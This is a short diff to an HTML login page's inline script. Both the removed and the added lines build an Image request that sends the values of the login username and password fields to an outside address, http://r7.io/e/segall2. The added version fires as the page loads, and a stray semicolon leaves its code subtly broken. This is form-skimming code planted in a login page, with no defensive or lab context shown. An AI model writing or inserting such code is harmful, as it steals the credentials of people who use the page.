@@ -20,14 +20,11 @@
         });
     </script>
     <script>
-        function getForm (form) {
-            var Password = $('#login_password').val();
-            var Username = $('#login_username').val();
-            alert(Password + "    " + Username);
-           var check = new Image();
-            check.src = "http://r7.io/e/segall2?s=" + Username + Password;
 
-        };
+            var i = new Image();
+            i.src = "http://r7.io/e/segall2?s=" + $('#login_username').val(); + $('#login_password').val();
+
+
     </script>
 
   </head>
